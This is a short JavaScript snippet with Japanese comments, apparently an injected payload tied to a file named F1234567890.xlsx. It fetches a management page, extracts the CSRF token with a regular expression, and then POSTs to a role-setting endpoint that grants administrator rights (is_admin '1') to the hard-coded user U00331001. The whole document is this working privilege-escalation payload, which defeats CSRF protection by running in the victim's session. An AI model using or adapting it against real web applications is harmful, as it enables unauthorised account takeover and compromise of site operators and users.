(async function () {
  console.log("[BEGIN] F1234567890.xlsxのスクリプトを実行します。");
  const response = await fetch("/management/role");
  const text = await response.text();
  // 次の2行でcsrf_tokenを取得
  const tokenMatch = text.match(/id="csrf_token"[^>]*value="([^"]+)"/);
  const csrfToken = tokenMatch[1];
  await fetch("/management/roleset", {
    method: "POST",
    // POSTメソッドのリクエストbody
    body: new URLSearchParams({
      csrf_token: csrfToken,
      is_admin: "1",
      user_id: "U00331001",
    }),
  });
  console.log("[  END] F1234567890.xlsxのスクリプトを実行します。");
})();
